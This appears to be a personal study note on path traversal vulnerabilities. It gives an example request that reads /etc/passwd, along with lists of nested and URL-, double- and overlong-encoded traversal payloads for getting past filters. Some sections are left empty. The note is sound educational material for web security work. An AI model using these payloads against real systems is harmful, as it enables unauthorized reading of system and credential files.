---
created: 2026-05-02
---
## Path traversal

Applications often need to access files based on user input — for example, serving downloads, images, logs, or user-uploaded content.

When user-controlled input is used to construct file paths without proper validation, this can lead to **path traversal vulnerabilities**.

>**Path traversal** (also called **directory traversal**) occurs when an application uses user-controlled input to access files, allowing attackers to escape the intended directory and access arbitrary locations on the filesystem.

or
>**Path traversal** (also called **directory traversal**) is a web application security vulnerability that allows attackers to access files and directories stored outside the intended scope of the application.

- Path traversal resides under [`A01:2025 Broken Access Control`](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/), and mapped to:
	- [`CWE-23 Relative Path Traversal`](https://cwe.mitre.org/data/definitions/23.html)
	- [`CWE-36 Absolute Path Traversal`](https://cwe.mitre.org/data/definitions/36.html)

>[!important] Prerequisites: [[🛠️ Filesystem fundamentals]]. 

- For example, in a book shop website, a cover image of each book is loaded using:

```HTML
<img src="/load_image?file=11.jpg"
```

- The `load_image` URL takes a `file` parameter and returns the contents of the specified file.
- The image files are stored on disk at `/var/www/images/`.
- To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:

```powershell
/var/www/images/11.png
```

- If the application doesn't implement proper validation of the `load_image` API, an attacker can request  the following URL to retrieve the `/etc/passwd` file from the server's filesystem:

```powershell
https://example.com/load_image?file=../../../etc/passwd
```

- The three consecutive `../` sequences step up from `/var/www/images/` to the filesystem root, and so the file that is actually read is:

```powersell
/etc/passwd
```
### How path traversal works

- Path traversal is fundamentally a **boundary violation** (broken access control): 
	- The application intends to restrict access to a specific directory (e.g., `/var/www/images/`).
	- The attacker **escapes that directory** using crafted paths, such as `../../../../etc/passwd`.

- There are two types of path traversal vulnerabilities:
	- **Relative path traversal**
	- **Absolute path traversal**
### Potential impact

## Path traversal testing metholodody

### 1. 

We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.

```PowerShell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```
### Validation bypass

### Nested traversal sequences

Many filters remove or block traversal sequences like `../` or `..\`. But if the filter is not recursive, nested sequences bypass the protection:

- `....//....//....//` -> After removing one `../`, still leaves `../`.
- `..../\..../\..../\` -> Mixes slashes `/` and backslashes `\` for cross-platform bypass.

The filter removes one instance of `../`, but nested characters reconstitute valid traversal sequences.

```
....//....//....//etc/passwd
```

```
....//....//....//
..././..././..././
..../\..../\..../\
.../.\.../.\.../.\
....\/....\/....\/
...\./...\./...\./
```

![[nested_path_traversal_sequences.svg|600]]

### Encoding 


- Encoding:

| Character | URL encoding                                                 | Double URL encoding | Unicode encoding     | Overlong UTF-8 Unicode encoding |
| --------- | ------------------------------------------------------------ | ------------------- | -------------------- | ------------------------------- |
| `.`       | `%2e`                                                        | `%252e`             | `%u002e`             | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/`       | `%2f`                                                        | `%252f`             | `%u2215`             | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\`       | `%5c`                                                        | `%255c`             | `%u2216`             | `%c0%5c`, `%c0%80%5c`           |
| `../`     | `<span style='color: var(--mk-color-blue)'>%2e%2e%2f</span>` | `%252e%252e%252f`   | `%u002e%u002e%u002f` | `%c0%2e%c0%2e%c0%af`            |
| `..\`     | `%2e%2e%5c`                                                  | `%252e%252e%255c`   | `%u002e%u002e%u005c` | `%c0%2e%c0%2e%c0%5c`            |

```
../../../ -> 
URL: %2e%2e%2f%2e%2e%2f%2e%2e%2f

%c0%2e%c0%2e%c0%af
 
```

>[!note] See [[🛠️ Obfuscating attacks using encoding]]



## References and further reading

- [`Path traversal — PortSwigger Web Security Academy`](https://portswigger.net/web-security/file-path-traversal)
- [`Path Traversal — OWASP`](https://owasp.org/www-community/attacks/Path_Traversal)
- [`Directory Traversal — Payloads All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/#tools)